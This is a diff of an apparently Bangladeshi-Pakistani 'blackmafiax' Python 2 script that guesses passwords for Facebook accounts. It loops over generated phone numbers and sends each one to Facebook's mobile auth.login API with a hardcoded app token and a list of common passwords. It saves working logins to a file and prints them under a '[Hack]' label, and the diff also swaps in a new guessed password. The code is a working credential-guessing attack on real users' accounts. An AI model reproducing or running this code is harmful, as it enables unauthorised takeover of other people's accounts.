@@ -14578,31 +14578,31 @@ def test4():
 def blackmafiax():
 	os.system('clear')
 	print logo2
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[1]  Bangladesh\033[1;91m☆.\x1b[1;92m[14]  Australia'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[1]  Bangladesh\033[1;91m☆.\x1b[1;96m[14]  Australia'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[2]  USA       \033[1;91m☆.\x1b[1;92m[15]  Canda'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[2]  USA       \033[1;91m☆.\x1b[1;96m[15]  Canda'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[3]  UK        \033[1;91m☆.\x1b[1;92m[16]  China'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[3]  UK        \033[1;91m☆.\x1b[1;96m[16]  China'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[4]  India     \033[1;91m☆.\x1b[1;92m[17]  Denmark'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[4]  India     \033[1;91m☆.\x1b[1;96m[17]  Denmark'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[5]  Brazil    \033[1;91m☆.\x1b[1;92m[18]  France'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[5]  Brazil    \033[1;91m☆.\x1b[1;96m[18]  France'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[6]  Japan     \033[1;91m☆.\x1b[1;92m[19]  Germany'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[6]  Japan     \033[1;91m☆.\x1b[1;96m[19]  Germany'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[7]  Korea     \033[1;91m☆.\x1b[1;92m[20]  Malaysia'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[7]  Korea     \033[1;91m☆.\x1b[1;96m[20]  Malaysia'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[8]  Italy     \033[1;91m☆.\x1b[1;92m[21]  Sri lanka'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[8]  Italy     \033[1;91m☆.\x1b[1;96m[21]  Sri lanka'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[9]  Spain     \033[1;91m☆.\x1b[1;92m[22]  Turkey'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[9]  Spain     \033[1;91m☆.\x1b[1;96m[22]  Turkey'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[10] Poland    \033[1;91m☆.\x1b[1;92m[23]  U.A.E'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[10] Poland    \033[1;91m☆.\x1b[1;96m[23]  U.A.E'
         time.sleep(0.05)
-        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[11] Pakistan  \033[1;91m☆.\x1b[1;92m[24]  Saudi Arabia'
+        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[11] Pakistan  \033[1;91m☆.\x1b[1;96m[24]  Saudi Arabia'
         time.sleep(0.05)
-	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[12] Indonasia \033[1;91m☆.\x1b[1;92m[25]  Israil'
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[12] Indonasia \033[1;91m☆.\x1b[1;96m[25]  Israil'
         time.sleep(0.05)
-        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[13] Grecee    \033[1;91m☆.\x1b[1;92m[26]  Iran'
+        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;96m[13] Grecee    \033[1;91m☆.\x1b[1;96m[26]  Iran'
         time.sleep(0.05)
 	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;91m[0]  Back            '
         time.sleep(0.05)
@@ -15034,14 +15034,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[Successful] ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
+				print '\x1b[1;92m[Hack]   Email ' + k + c + user + ' Password' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;96m[Checkpoint] ' + k + c + user + ' -•◈•- ' + pass1+'\n'
+					print '\033[1;96m[Checkpoint]   Email ' + k + c + user + ' Password ' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
 					cps.close()
@@ -15051,14 +15051,14 @@ def action():
  				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				    q = json.load(data)
  				    if 'access_token' in q:
- 				        print '\x1b[1;92m[Successful] ' + k + c + user + ' -•◈•- ' + pass2+'\n'+"\n"
+ 				        print '\x1b[1;92m[Hack]    Email' + k + c + user + ' Password ' + pass2+'\n'+"\n"
  				        okb = open('save/successfull.txt', 'a')
  				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
  				        okb.close()
  				        oks.append(c+user+pass2)
  				    else:
  				        if 'www.facebook.com' in q['error_msg']:
- 					        print '\033[1;96m[Checkpoint] ' + k + c + user + ' -•◈•- ' + pass2+'\n'
+ 					        print '\033[1;96m[Checkpoint]    Email' + k + c + user + ' Password ' + pass2+'\n'
  					        cps = open('save/checkpoint.txt', 'a')
  					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
  					        cps.close()
@@ -15068,31 +15068,31 @@ def action():
  				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				            q = json.load(data)
  				            if 'access_token' in q:
- 				                print '\x1b[1;92m[Successful] ' + k + c + user + ' -•◈•- ' + pass3+'\n'+"\n"
+ 				                print '\x1b[1;92m[Hack]   Email ' + k + c + user + ' Password' + pass3+'\n'+"\n"
  				                okb = open('save/successfull.txt', 'a')
  				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
  				                okb.close()
  				                oks.append(c+user+pass3)
  				            else:
  				                if 'www.facebook.com' in q['error_msg']:
- 					                print '\033[1;96m[Checkpoint] ' + k + c + user + ' -•◈•- ' + pass3+'\n'
+ 					                print '\033[1;96m[Checkpoint]    Email' + k + c + user + ' Password ' + pass3+'\n'
  					                cps = open('save/checkpoint.txt', 'a')
  					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
  					                cps.close()
  					                cpb.append(c+user+pass3)
                                                 else:
- 				                    pass4="112233"
+ 				                    pass4="Pakistan786"
  				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				                    q = json.load(data)
  				                    if 'access_token' in q:
- 				                        print '\x1b[1;92m[Successful] ' + k + c + user + ' -•◈•- ' + pass4+'\n'+"\n"
+ 				                        print '\x1b[1;92m[Hack]    Email' + k + c + user + ' Password ' + pass4+'\n'+"\n"
  				                        okb = open('save/successfull.txt', 'a')
  				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
  				                        okb.close()
  				                        oks.append(c+user+pass4)
  				                    else:
  				                        if 'www.facebook.com' in q['error_msg']:
- 					                        print '\033[1;96m[Checkpoint] ' + k + c + user + ' -•◈•- ' + pass4+'\n'
+ 					                        print '\033[1;96m[Checkpoint]   Email ' + k + c + user + ' Password' + pass4+'\n'
  					                        cps = open('save/checkpoint.txt', 'a')
  					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
  					                        cps.close()
